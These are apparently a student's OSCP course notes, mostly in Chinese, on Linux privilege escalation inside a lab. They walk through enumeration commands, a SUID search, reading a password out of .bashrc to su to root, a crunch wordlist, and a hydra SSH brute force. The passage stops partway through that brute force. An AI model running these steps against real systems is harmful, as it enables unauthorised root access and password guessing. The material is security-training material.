---
title: '[OSCP, PEN-200] Instructional notes - Part 4'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 4
===


# Table of Contents
[TOC]

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)


>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 3](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md) 內容

# Linux Privilege Escalation
如何 enumerate Linux machines 與 Linux privileges 的結構
## Enumerating Linux
manual and automated enumeration techniques
### Understanding Files and Users Privileges on Linux
每個檔案都遵循三個主要屬性的 user 和 group 權限：\
讀取（r）、寫入（w）和 執行（x)
```
┌──(chw㉿CHW)-[~]
└─$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1386 Feb  3 04:21 /etc/shadow
```
### Manual Enumeration
#### - id
使用 `id` 收集使用者資訊
```
┌──(chw㉿CHW)-[~]
└─$ ssh joe@192.168.223.214 
...
joe@192.168.223.214's password: 
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb 15 04:15:11 2023 from 192.168.118.3
joe@debian-privesc:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```
#### - /etc/passwd
enumerate all users: /etc/passwd
```
joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
```
> `www-data`與 `sshd`。表示系統上可能安裝了 Web Server 和 SSH Server。\
> `x`: 包含使用者密碼的雜湊版本，包含在 /etc/shadow\
> `UID` : 1000 - 除了 root 使用者的 UID 為 0 外，Linux 從 1000 開始計數普通使用者 ID。\
> `GID`： 1000 － 代表使用者特定的群組 ID。\
> `/home/joe`: 描述使用者登入時提示的主目錄\
> `/bin/bash`: － 表示預設 interactive shell
>> 另一個 user: eve ， 配置的主資料夾在 /home/eve

>[!Important]
>system services 將 `/usr/sbin/nologin` 作為登入 shell，其中nologin 用於阻止服務帳戶的任何遠端或本機登入

#### - hostname
主機名稱通常可以提供有關其功能的線索，`web` 表示 Web server，`db` 表示資料庫伺服器，`dc` 表示 domain controller
```
joe@debian-privesc:~$ hostname
debian-privesc
```
企業通常會對 hostname 命名，以便按位置、描述、作業系統和服務等級進行分類。通常由兩部分組成: `OS type` + `description`\
#### - /etc/issue & /etc/os-release
issue 和 os-release 檔案包含作業系統版本（Debian 10）和特定於發布的信息，包括 distribution codename。
```
joe@debian-privesc:~$ cat /etc/issue
Debian GNU/Linux 10 \n \l

joe@debian-privesc:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
#### - uname -a
輸出作業系統核心版本（4.19.0）和架構（x86_64）
```
joe@debian-privesc:~$ uname -a
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux
```

#### - ps aux
列出系統process（包括 privileged users)
```
joe@debian-privesc:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169592 10176 ?        Ss   Aug16   0:02 /sbin/init
...
colord     752  0.0  0.6 246984 12424 ?        Ssl  Aug16   0:00 /usr/lib/colord/colord
Debian-+   753  0.0  0.2 157188  5248 ?        Sl   Aug16   0:00 /usr/lib/dconf/dconf-service
root       477  0.0  0.5 179064 11060 ?        Ssl  Aug16   0:00 /usr/sbin/cups-browsed
root       479  0.0  0.4 236048  9152 ?        Ssl  Aug16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1656  0.0  0.0      0     0 ?        I    01:03   0:00 [kworker/1:2-events_power_efficient]
joe       1657  0.0  0.4  21160  8960 ?        Ss   01:03   0:00 /lib/systemd/systemd --user
joe       1658  0.0  0.1 170892  2532 ?        S    01:03   0:00 (sd-pam)
joe       1672  0.0  0.2  14932  5064 ?        S    01:03   0:00 sshd: joe@pts/0
joe       1673  0.0  0.2   8224  5020 pts/0    Ss   01:03   0:00 -bash
root      1727  0.0  0.0      0     0 ?        I    03:00   0:00 [kworker/0:0-ata_sff]
root      1728  0.0  0.0      0     0 ?        I    03:06   0:00 [kworker/0:2-ata_sff]
joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu
```
> `a（all）`：顯示所有使用者的 process。\
`x`：顯示不與終端（[TTY](https://www.linusakesson.net/programming/tty/)）關聯的進程，例如系統守護（daemons）。\
`u（user-readable）`：較易讀的格式顯示進程資訊，包括使用者名稱、CPU 使用率、記憶體使用率等。
>> 輸出列出了以 root 身分運行的幾個 process，這些 process 值得研究可能存在的漏洞\
>> `joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu`: 可以看到當下輸入的 ps command 也列在輸出中。可以使用適當的使用者名稱從輸出中過濾特定的使用者擁有的 process。

#### - network interfaces, routes, and open ports
使用 ifconfig 或ip列出每個網路介面卡的 TCP/IP 設定
- `ifconfig`: 顯示 interface statistics
- `ip`: compact version of the same information

```
joe@debian-privesc:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b9:fc brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.214/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b9fc/64 scope link
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:72:64 brd ff:ff:ff:ff:ff:ff
    inet 172.16.60.214/24 brd 172.16.60.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:7264/64 scope link
       valid_lft forever preferred_lft forever
```

使用 route 或 routel 顯示網路路由表
- routel
```
joe@debian-privesc:~$ routel
         target            gateway          source    proto    scope    dev tbl
/usr/bin/routel: 48: shift: can't shift that many
        default     192.168.50.254                   static          ens192
    172.16.60.0 24                   172.16.60.214   kernel     link ens224
   192.168.50.0 24                  192.168.50.214   kernel     link ens192
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
    172.16.60.0          broadcast   172.16.60.214   kernel     link ens224 local
  172.16.60.214              local   172.16.60.214   kernel     host ens224 local
  172.16.60.255          broadcast   172.16.60.214   kernel     link ens224 local
   192.168.50.0          broadcast  192.168.50.214   kernel     link ens192 local
 192.168.50.214              local  192.168.50.214   kernel     host ens192 local
 192.168.50.255          broadcast  192.168.50.214   kernel     link ens192 local
            ::1                                      kernel              lo
         fe80:: 64                                   kernel          ens224
         fe80:: 64                                   kernel          ens192
            ::1              local                   kernel              lo local
fe80::250:56ff:fe8a:7264              local                   kernel          ens224 local
fe80::250:56ff:fe8a:b9fc              local                   kernel          ens192 local
```
可以使用 netstat 或 ss 顯示活動的網路連接和監聽端口
- ss -anp
```
joe@debian-privesc:~$ ss -anp
Netid      State       Recv-Q      Send-Q                                        Local Address:Port                     Peer Address:Port
nl         UNCONN      0           0                                                         0:461                                  *
nl         UNCONN      0           0                                                         0:323                                  *
nl         UNCONN      0           0                                                         0:457                                  *
...
udp        UNCONN      0           0                                                      [::]:47620                            [::]:*
tcp        LISTEN      0           128                                                 0.0.0.0:22                            0.0.0.0:*
tcp        LISTEN      0           5                                                 127.0.0.1:631                           0.0.0.0:*
tcp        ESTAB       0           36                                           192.168.50.214:22                      192.168.118.2:32890
tcp        LISTEN      0           128                                                       *:80                                  *:*
tcp        LISTEN      0           128                                                    [::]:22                               [::]:*
tcp        LISTEN      0           5                                                     [::1]:631                              [::]:*
```
> `ss（Socket Statistics）`：比 `netstat` 更快更現代。\
`-a（all）`：顯示所有 socket，包含 LISTEN 和非 LISTEN 狀態的連線。\
`-n（numeric）`：以數字格式顯示地址和端口，避免解析 DNS（加快查詢速度）。\
`-p（process）`：顯示與每個 socket 關聯的 process 名稱（需要 root 權限）。
>> 可以看到目前連線的 SSH connection 和 listening socket

#### - firewall rules 
1. 主要注意評估的遠端利用階段防火牆的 state, profile, and rules，在提權也可能會使用到。
2. 收集有關 inbound 與 outbound port filtering 的資訊，以便在轉向內部網路時方便進行 port forwarding 和 tunneling 傳輸。
3. 必須具有 root 權限才能使用 iptables 列出防火牆規則，🥚 防火牆的 configured，可以作為一般使用者收集有關規則的資訊。其中也包含 `iptables-save` 創建的檔案，將 firewall configuration 轉存到 user 中

```
joe@debian-privesc:~$ cat /etc/iptables/rules.v4
# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
# Completed on Thu Aug 18 12:53:22 2022
```
>`-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT`: 允許所有連接到 TCP 1999 port 的流量進入 (可能是某個服務在監聽）

#### - cron ( job scheduler)
Scheduled tasks 在/etc/cron.* 目錄下，可以在/etc/cron.daily 下找到每天運行的任務。
```
joe@debian-privesc:~$ ls -lah /etc/cron*
-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rw-r--r--   1 root root  285 May 19  2019 anacron
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.daily:
total 60K
drwxr-xr-x   2 root root 4.0K Aug 18  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.hourly:
total 20K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rwxr-xr-x   1 root root  313 May 19  2019 0anacron
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rwxr-xr-x   1 root root  3
```
> `/etc/crontab`, daily, hourly, monthly, weekly

系統管理員經常在 /etc/crontab 檔案中新增自己的排程任務\
檢查 /etc/crontab 檔案權限，通常需要以 root 編輯: `crontab -l`
```
joe@debian-privesc:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
```
> 只有 comment，這意味著 joe 沒有配置 cron 作業

嘗試使用 sudo，顯示由 root 執行的作業
```
joe@debian-privesc:~$ sudo crontab -l
[sudo] password for joe:
# Edit this file to introduce tasks to be run by cron.
...
# m h  dom mon dow   command

* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```
> 顯示了以 root 身分執行的備份腳本
> > 若這個 shell weak permissions，可以利用它來提權

#### - dpkg & rpm
package 管理器：\
Debian-based Linux distributions 使用 `dpkg`\
Red Hat-based systems 使用 `rpm`
```
joe@debian-privesc:~$ dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                  Version                                      Architecture Description
+++-=====================================-============================================-============-===============================================================================
ii  accountsservice                       0.6.45-2                                     amd64        query and manipulate user account information
ii  acl                                   2.2.53-4                                     amd64        access control list - utilities
ii  adduser                               3.118                                        all          add and remove users and groups
ii  adwaita-icon-theme                    3.30.1-1                                     all          default icon theme of GNOME
ii  aisleriot                             1:3.22.7-2                                   amd64        GNOME solitaire card game collection
ii  alsa-utils                            1.1.8-2                                      amd64        Utilities for configuring and using ALSA
ii  anacron                               2.3-28                                       amd64        cron-like program that doesn't go by time
ii  analog                                2:6.0-22                                     amd64        web server log analyzer
ii  apache2                               2.4.38-3+deb10u7                             amd64        Apache HTTP Server
ii  apache2-bin                           2.4.38-3+deb10u7                             amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                          2.4.38-3+deb10u7                             all          Apache HTTP Server (common files)
ii  apache2-doc                           2.4.38-3+deb10u7                             all          Apache HTTP Server (on-site documentation)
ii  apache2-utils                         2.4.38-3+deb10u7                             amd64        Apache HTTP Server (utility programs for web servers)
...
```
> 先前透過枚舉監聽 port 發現的，Debian 10 機器正在執行 Apache2 Web Server

#### - find
我們不可能手動檢查每個檔案權限，可以使用 find 來識別具有不安全權限的檔案
```
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
..
/home/joe
/home/joe/Videos
/home/joe/Templates
/home/joe/.local
/home/joe/.local/share
/home/joe/.local/share/sounds
/home/joe/.local/share/evolution
/home/joe/.local/share/evolution/tasks
/home/joe/.local/share/evolution/tasks/system
/home/joe/.local/share/evolution/tasks/trash
/home/joe/.local/share/evolution/addressbook
/home/joe/.local/share/evolution/addressbook/system
/home/joe/.local/share/evolution/addressbook/system/photos
/home/joe/.local/share/evolution/addressbook/trash
/home/joe/.local/share/evolution/mail
/home/joe/.local/share/evolution/mail/trash
/home/joe/.local/share/evolution/memos
/home/joe/.local/share/evolution/memos/system
/home/joe/.local/share/evolution/memos/trash
/home/joe/.local/share/evolution/calendar
/home/joe/.local/share/evolution/calendar/system
/home/joe/.local/share/evolution/calendar/trash
/home/joe/.local/share/icc
/home/joe/.local/share/gnome-shell
/home/joe/.local/share/gnome-settings-daemon
/home/joe/.local/share/keyrings
/home/joe/.local/share/tracker
/home/joe/.local/share/tracker/data
/home/joe/.local/share/folks
/home/joe/.local/share/gvfs-metadata
/home/joe/.local/share/applications
/home/joe/.local/share/nano
/home/joe/Downloads
/home/joe/.scripts
/home/joe/Pictures
/home/joe/.cache

...
```
> `find /`：從根目錄開始搜尋\
`-writable`：只篩選可寫入 (writable) 的檔案或目錄\
`-type d`：只顯示目錄 (directory)\
`2>/dev/null`：將錯誤訊息 (stderr) 導向到 /dev/null
>> 幾個目錄似乎是 world-writable，包括 `/home/joe/.scripts` 目錄，可以對應到之前找到的 cron 腳本的位置。

#### - mount & /etc/fstab
在大多數系統上， drives 在啟動時會自動安裝。因此，我們很容易忘記可能包含有價值資訊的 unmounted drives。如果 unmounted drives 存在，則可以檢查安裝權限。
- mount: 列出所有已掛載的檔案系統
- /etc/fstab: 列出了啟動時將安裝的所有 drives

```
joe@debian-privesc:~$ cat /etc/fstab 
...
UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

joe@debian-privesc:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
...
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=10550)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
```
> `/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)`:顯示了一個交換分割區 (swap partition) 和該 Linux 系統的主 ext4 磁碟。

>[!Tip]
>System administrator might have used custom configurations or scripts to mount drives that are not listed in the `/etc/fstab` file. Because of this, it's good practice to not only scan `/etc/fstab`, but to also gather information about mounted drives using `mount`.

#### - lsblk (all available disks)
```
joe@debian-privesc:~$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   32G  0 disk
|-sda1   8:1    0   31G  0 part /
|-sda2   8:2    0    1K  0 part
`-sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom
```
> sda drive 由三個不同編號的分割區組成，可以透過 system configuration 收集 documents 或 credentials

#### - lsmod (drivers and kernel modules)
另一種常見的提權技術利用 device drivers 和 kernel modules，可以使用 `lsmod` enumerate drivers and kernel modules

```
joe@debian-privesc:~$ lsmod
Module                  Size  Used by
binfmt_misc            20480  1
rfkill                 28672  1
sb_edac                24576  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
vmw_balloon            20480  0
...
drm                   495616  5 vmwgfx,drm_kms_helper,ttm
libata                270336  2 ata_piix,ata_generic
vmw_pvscsi             28672  2
scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
i2c_piix4              24576  0
button                 20480  0
```
> `libata                270336  2 ata_piix,ata_generic`: 以使用 modinfo 來了解有關特定模組的更多資訊: `/sbin/modinfo`

/sbin/modinfo
```
joe@debian-privesc:~$ /sbin/modinfo libata
filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
version:        3.00
license:        GPL
description:    Library module for ATA devices
author:         Jeff Garzik
srcversion:     00E4F01BB3AA2AAF98137BF
depends:        scsi_mod
retpoline:      Y
intree:         Y
name:           libata
vermagic:       4.19.0-21-amd64 SMP mod_unload modversions
sig_id:         PKCS#7
signer:         Debian Secure Boot CA
sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
...
```
> 獲得了驅動程式及版本，可以更好地找到相關的漏洞。

#### - SUID 
- setuid：當檔案的所有者是 root 且該檔案具有 setuid 權限時，任何使用者執行該檔案時，會以 root 的權限來執行該檔案。
- setgid：當檔案具有 setgid 權限時，執行該檔案的使用者會繼承檔案所屬群組的權限。
- UID/GID（eUID/eGID）：當使用者或系統腳本啟動一個具有 SUID 權限的應用程式時，這個應用程式會繼承發起該腳本的使用者或群組的 UID/GID，這被稱為**有效 UID/GID**（eUID, eGID）。

這些特殊權限會改變檔案執行的權限方式。通常，執行檔案的使用者會繼承該檔案的執行權限。但當檔案設有 SUID 權限，該檔案將會以檔案擁有者（通常是 root）的身份執行。這意味著如果一個二進位檔案（binary）設有 SUID 且由 root 擁有，那麼任何本地使用者都可以以 root 權限執行這個檔案，進而提升權限。
👉🏻 如果能夠讓一個具有 SUID 權限的 root 程式執行自己選擇的命令，則可以模擬 root 使用者的身份，獲得所有系統權限。

使用 find 搜尋帶有 SUID 標記的二進位檔案
```
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```
> `-type f`：僅搜尋檔案\
`-perm -u=s`：篩選出設有 SUID 權限的檔案

如果 /bin/cp（複製命令）是 SUID，我們可以複製並覆寫敏感文件，如 /etc/passwd。

### Automated Enumeration
在 UNIX 衍生產品（例如 Linux）上使用 `unix-privesc-check`
已預設安裝在 Kali 的：`/usr/bin/unix-privesc-check`
```
┌──(chw㉿CHW)-[/usr/bin]
└─$ unix-privesc-check
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

Usage: unix-privesc-check { standard | detailed }

"standard" mode: Speed-optimised check of lots of security settings.

"detailed" mode: Same as standard mode, but also checks perms of open file
                 handles and called files (e.g. parsed from shell scripts,
                 linked .so files).  This mode is slow and prone to false 
                 positives but might help you find more subtle flaws in 3rd
                 party programs.

This script checks file permissions and other settings that could allow
local users to escalate privileges.

Use of this script is only permitted on systems which you have been granted
legal permission to perform a security assessment of.  Apart from this 
condition the GPL v2 applies.

Search the output for the word 'WARNING'.  If you don't see it then this
script didn't find any problems.
```
> 支援 "standard" 和 "detailed" 模式
> standard mode 似乎執行了速度優化的過程，並且應該可以減少誤報的數量

腳本會對常見文件的權限執行大量檢查。例如，以下顯示非 root 使用者可寫入的設定檔：
```
┌──(chw㉿CHW)-[/usr/bin]
└─$ ./unix-privesc-check standard 
...
Checking for writable config files
############################################
    Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
    Checking if anyone except root can change /etc/group
    Checking if anyone except root can change /etc/fstab
    Checking if anyone except root can change /etc/profile
    Checking if anyone except root can change /etc/sudoers
    Checking if anyone except root can change /etc/shadow
```

## Exposed Confidential Information
檢查 user 和 service history files 達到提權
### Inspecting User Trails
使用者的歷史文件通常包含明文使用者活動，其中可能包括密碼或其他驗證資料等敏感資訊。
- [dotfiles](https://wiki.archlinux.org/title/Dotfiles): 應用程式通常會將使用者特定的設定檔案和子目錄儲存在使用者的主目錄下，這些檔案名稱前面會加上一個 dot（.）。
`.bashrc` 是一個常見的 dotfile。當一個新的終端視窗在現有的登入會話中開啟，或者當從現有的登入會話啟動新的 shell 時，`.bashrc` 這個 bash 腳本會被執行。在這個腳本中，使用者可以設定環境變數，這些環境變數會在每次開啟新的 shell 實例時自動設置。
#### 1. 查看 env
```
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```
> 在 env 看到一個不尋常的環境變數: `SCRIPT_CREDENTIALS=lab`

`SCRIPT_CREDENTIALS` 變數會保存一個類似密碼的值。為了確認我們正在處理永久變量，因此需要檢查`.bashrc`
```
joe@debian-privesc:~$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
...
```
> 從 `.bashrc` 中得知，當使用者的 shell 啟動時，保存密碼的變數會被匯出
#### 2. 嘗試使用 .bashrc 資訊取得 root
嘗試用密碼使用 root 權限
```
joe@debian-privesc:~$ su - root
Password:

root@debian-privesc:~# whoami
root
```
> 成功取得 root

接著換一種方式，取得在上述有發現的 user: eve
#### crunch (custom wordlist)
使用 crunch cmd工具產生自訂 wordlist。將最小長度和最大長度設為 6 個字元，使用 `-t` 參數指定模式，然後將前三個字符硬編碼為Lab ，後面跟著三個數字。
```
┌──(chw㉿CHW)-[~]
└─$ crunch 6 6 -t Lab%%% > wordlist
Crunch will now generate the following amount of data: 7000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000 
                                       
┌──(chw㉿CHW)-[~]
└─$ cat wordlist                   
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
...
Lab999
```
#### 3. hydra 爆破 user password
使用 hydra 爆破 ssh eve
```
┌──(chw㉿CHW)-[~]
└─$ hydra -l eve -P wordlist  192.168.163.214 -t 4 ssh -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-25 04:21:16
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
[DATA] attacking ssh://192.168.163.214:22/
[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0] (0/0)
